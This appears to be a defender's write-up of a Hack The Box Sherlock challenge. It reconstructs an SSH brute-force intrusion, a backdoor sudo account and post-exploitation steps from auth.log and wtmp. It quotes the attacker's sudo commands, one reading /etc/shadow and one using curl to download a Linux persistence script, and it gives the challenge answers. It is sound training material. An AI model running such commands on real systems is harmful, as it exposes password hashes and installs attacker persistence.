# Incident Triage Report: HTB Sherlock - Brutus

- **Difficulty:** Very Easy (Retired Sherlock)
- **Category:** SOC / DFIR: Linux Log Analysis
- **Artifacts Analyzed:** `auth.log` and `wtmp` 
- **MITRE ATT&CK Techniques:** `T1110.001` (Brute Force: Password Guessing), `T1078.003` (Valid Accounts: Local Accounts), `T1136.001` (Create Account: Local Account), `T1098.007` (Account Manipulation: Additional Local or Domain Groups), `T1105` (Ingress Tool Transfer, attempted)

> **Spoiler warning:** This write-up includes the findings and answers for HTB Sherlock: Brutus.
>
> **Timestamp convention:** All times are March 6, 2024, in UTC. The `auth.log` timestamps don't include a year or timezone, so I inferred both by matching events against `wtmp`, which carries a `+00:00` offset.

---

## 1. Executive Summary

On **March 6, 2024**, the Confluence server from the challenge scenario was hit with an SSH brute-force attack from `65.2.161.68`. I triaged `auth.log` and correlated it with the binary login records in `wtmp` to follow the attacker from a successful `root` login, to an interactive terminal session, to a new backdoor account (`cyberjunkie`) added to the `sudo` group.

From that account, the attacker used `sudo` to try to read `/etc/shadow` and to get a Linux persistence script (`linper.sh`) with `curl`. The logs show those commands being invoked. They don't show whether the download succeeded or whether the script ever ran.

---

## 2. Investigation Walkthrough

### 2.1 Noise Reduction

In `auth.log` I noticed `CRON` session messages for the user `confluence` (`uid=998`), opened by `uid=0`, landing at the start of every minute (`xx:xx:01`).

To focus on SSH activity, I filtered them out into a working copy and left the original log untouched:

```bash
cat auth.log | grep -v 'CRON' > auth1.log
```

This is just a readability shortcut. Session open/close lines don't tell me what a scheduled job actually ran, so I can't call the cron activity benign from this log alone. It also means any cron-related activity the attacker might have created got filtered out too, so in a live case cron would get its own pass.

### 2.2 Identifying the Brute-Force Attack & Source IP

A brute-force attack should leave plenty of authentication failures against both valid and invalid accounts, so I searched the filtered log for invalid-user events:

```bash
cat auth1.log | grep -i 'invalid user'
```

Bingo! All attempts pointed back to one external IP: **`65.2.161.68`**. The password-failure records from the same source backed this up, including attempts against valid accounts like `root`.

One thing worth noting is: an `Invalid user` line marks an attempt against an account that doesn't exist. It isn't a count of failed password checks.
### 2.3 Tracing Initial Access vs. Interactive Login

Next I searched for successful logins (`Accepted password`) to see which account actually fell.

The attacker first authenticated as **`root`** at **`06:31:40`** (`sshd[2411]`, **Session `34`**) and disconnected within the same recorded second. Lots of failures, then a quick success and an instant disconnect, suggests an automated tool checking whether a credential works. The logs don't tell me which tool.

A second `root` authentication followed at **`06:32:44`**, 64 seconds after the first, assigned **Session `37`**. To check the terminal side, I dumped `wtmp`:

```bash
utmpdump wtmp
```

`wtmp` shows `root` on **`pts/1`** from `65.2.161.68` at **`06:32:45`**, one second after the SSH authentication and 65 seconds after the first login. These are two separate events: the authentication, then the terminal login being recorded. Session `37` comes from `systemd-logind` in `auth.log`, not from a field in the `utmpdump` output, so correlating the two logs is what ties the terminal to the session.

`06:32:45` is the manual-login timestamp the Sherlock is after.

### 2.4 Persistence: Backdoor Account Creation (`T1136.001`)

While Session `37` was open, a new local account showed up. I isolated the creation events with:

```bash
cat auth1.log | grep -E 'new user|new group'
```

At **`06:34:18`**, a user and a group both named **`cyberjunkie`** (`UID=1002`, `GID=1002`) were created. At **`06:35:15`**, `usermod` added the account to the `sudo` group.

The "shadow group" message logged alongside it is the matching entry in `/etc/gshadow` for that same group. It isn't membership in a second group. Whether `sudo` membership actually grants privileges depends on the host's sudo policy, but the later sudo records show `cyberjunkie` running commands as `root`, so it seems it worked.

Account creation maps to **`T1136.001`**, and adding it to a privileged group maps to **`T1098.007`**. Together with the login that followed, this reads as a persistence mechanism.

The interactive `root` connection started at `06:32:45` and ended at **`06:37:24`**, according to `wtmp` logs. 

### 2.5 Post-Exploitation & Attempted Tool Transfer

Ten seconds after the `root` session closed, at **`06:37:34`**, `auth.log` recorded a successful password login for `cyberjunkie` from the same IP (**Session `49`**), with the `wtmp` terminal entry at `06:37:35`. Two `sudo` records from this session stand out.

At **`06:37:57`**, a command targeting the password-hash file, run as `root`:

```text
COMMAND=/usr/bin/cat /etc/shadow
```

This is an attempt to read the system's password hashes. `auth.log` records the invocation, not the output, so it doesn't establish that anything was read or exfiltrated.

At **`06:39:38`**, an attempt to fetch `linper.sh` from GitHub, again as `root`:

```text
COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
```

`linper` is a Linux persistence toolkit, so this maps to **`T1105`** and hints at what the attacker planned next. It doesn't prove any persistence mechanism was installed.

By default, `curl` writes the response to standard output, and the recorded arguments have no `-o` or `-O`. Taken alone, that command would just print the script to the terminal. A shell redirect or a pipe (into `bash`, for example) wouldn't necessarily show up in a sudo record, so where the output actually went is unknown.

---

## 3. Confirmed Facts vs. Unverified Hypotheses

To keep the triage honest, I separated what the artifacts recorded from what I'm inferring.

**Confirmed by the artifacts:**

- `65.2.161.68` generated repeated failed SSH logins against valid and invalid users before authenticating as `root`.
- The first successful connection (Session 34) closed within the same recorded second, and the supplied `wtmp` has no terminal-login entry for it.
- The second `root` authentication has a matching `wtmp` terminal entry on `pts/1`.
- `cyberjunkie` was created and added to `sudo` during Session 37's time window, then logged in from the same IP ten seconds after that session ended.
- `sudo` records show `cat /etc/shadow` and the `curl` invocation, both with `root` as the target user.

**Assessments and unverified hypotheses:**

- **Who made the account changes:** The timing, the attacker's existing `root` access, and the later `cyberjunkie` login all point to the attacker. 
- The `/etc/shadow` command shows an attempt. Reading, cracking, and exfiltration are not confirmed.
- The `curl` invocation is confirmed. A successful transfer, a file on disk, or execution of `linper.sh` is not.

---

## 4. Forensic Limitations 

With only `auth.log` and `wtmp`, there are gaps I'd need other telemetry to close in a live incident:

1. These artifacts aren't a full command history. `sudo` logs selected privileged invocations and tools like `useradd` and `usermod` log some account changes, but anything run inside a shell without `sudo` may leave no record here. Audit logs, EDR telemetry, or session recordings would cover this far better. Shell history can offer leads but may be incomplete or altered.
2. The logs can't tell me whether the script was retrieved, saved, or executed. Network telemetry and filesystem artifacts (cron jobs, SSH `authorized_keys`, systemd units) would show whether any additional persistence landed.
3. A successful SSH authentication doesn't always produce a terminal-login record. A missing `wtmp` entry doesn't prove no commands ran, and a terminal entry doesn't reveal everything done inside the session.
